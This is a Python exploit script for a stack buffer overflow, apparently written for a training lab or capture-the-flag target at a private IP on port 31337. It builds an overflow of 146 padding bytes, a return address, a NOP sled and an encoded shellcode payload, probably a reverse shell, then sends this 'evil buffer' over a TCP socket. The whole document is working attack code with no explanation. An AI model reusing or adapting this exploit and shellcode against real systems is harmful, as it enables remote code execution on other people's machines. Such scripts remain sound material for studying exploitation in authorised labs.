import socket

ip = "10.10.199.138"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = "\xda\xc7\xbb\x9d\x70\x73\x15\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x52\x83\xc5\x04\x31\x5d\x13\x03\xc0\x63\x91\xe0\x06\x6b\xd7\x0b\xf6\x6c\xb8\x82\x13\x5d\xf8\xf1\x50\xce\xc8\x72\x34\xe3\xa3\xd7\xac\x70\xc1\xff\xc3\x31\x6c\x26\xea\xc2\xdd\x1a\x6d\x41\x1c\x4f\x4d\x78\xef\x82\x8c\xbd\x12\x6e\xdc\x16\x58\xdd\xf0\x13\x14\xde\x7b\x6f\xb8\x66\x98\x38\xbb\x47\x0f\x32\xe2\x47\xae\x97\x9e\xc1\xa8\xf4\x9b\x98\x43\xce\x50\x1b\x85\x1e\x98\xb0\xe8\xae\x6b\xc8\x2d\x08\x94\xbf\x47\x6a\x29\xb8\x9c\x10\xf5\x4d\x06\xb2\x7e\xf5\xe2\x42\x52\x60\x61\x48\x1f\xe6\x2d\x4d\x9e\x2b\x46\x69\x2b\xca\x88\xfb\x6f\xe9\x0c\xa7\x34\x90\x15\x0d\x9a\xad\x45\xee\x43\x08\x0e\x03\x97\x21\x4d\x4c\x54\x08\x6d\x8c\xf2\x1b\x1e\xbe\x5d\xb0\x88\xf2\x16\x1e\x4f\xf4\x0c\xe6\xdf\x0b\xaf\x17\xf6\xcf\xfb\x47\x60\xf9\x83\x03\x70\x06\x56\x83\x20\xa8\x09\x64\x90\x08\xfa\x0c\xfa\x86\x25\x2c\x05\x4d\x4e\xc7\xfc\x06\x7b\x10\x84\xbf\x13\x22\x78\x51\xb8\xab\x9e\x3b\x50\xfa\x09\xd4\xc9\xa7\xc1\x45\x15\x72\xac\x46\x9d\x71\x51\x08\x56\xff\x41\xfd\x96\x4a\x3b\xa8\xa9\x60\x53\x36\x3b\xef\xa3\x31\x20\xb8\xf4\x16\x96\xb1\x90\x8a\x81\x6b\x86\x56\x57\x53\x02\x8d\xa4\x5a\x8b\x40\x90\x78\x9b\x9c\x19\xc5\xcf\x70\x4c\x93\xb9\x36\x26\x55\x13\xe1\x95\x3f\xf3\x74\xd6\xff\x85\x78\x33\x76\x69\xc8\xea\xcf\x96\xe5\x7a\xd8\xef\x1b\x1b\x27\x3a\x98\x3b\xca\xee\xd5\xd3\x53\x7b\x54\xbe\x63\x56\x9b\xc7\xe7\x52\x64\x3c\xf7\x17\x61\x78\xbf\xc4\x1b\x11\x2a\xea\x88\x12\x7f"
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
